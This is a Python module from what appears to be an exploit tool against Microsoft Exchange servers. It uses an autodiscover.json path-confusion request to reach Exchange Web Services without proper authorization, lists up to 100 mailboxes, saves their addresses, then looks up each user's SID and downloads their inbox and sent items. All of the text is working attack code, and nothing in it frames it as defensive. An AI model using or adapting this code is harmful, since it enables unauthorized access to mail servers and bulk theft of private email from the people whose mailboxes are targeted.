from main import *

def GetMails(target):
    logger.debug("[Stage 444] Get 100 email users")
    soap_body = convertFromTemplate({}, templatesFolder + "GetMails.xml")
    stage444 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=fun@fuk.fuk/ews/exchange.asmx", headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent,
            "Cookie": "Email=autodiscover/autodiscover.json?a=fun@fuk.fuk"
        },
        data=soap_body,
        verify=False
    )
    if stage444.status_code != 200:
        logger.error("[Stage 444] Get 100 email users Error! ResponseCode:{}".format(stage444.status_code))

    folderXML = ET.fromstring(stage444.content.decode())
    mailboxes = []
    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
        mailboxes.append(item.text)
    file1 = open('mailboxes', 'w').writelines('\n'.join(mailboxes))

    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
        try:
            print(f"Email Address  : {item.text}")
            for folder in {'inbox', 'sentitems'}:
                try:
                    DownloadEmails(target, GetSID(target, GetLegacyDN(target, item.text)), folder, item.text)
                except Exception as e:
                    logger.debug("Error! {}".format(e))
                    continue
        except Exception as e:
            logger.debug("{} Error! {}".format(item.text, e))
            continue

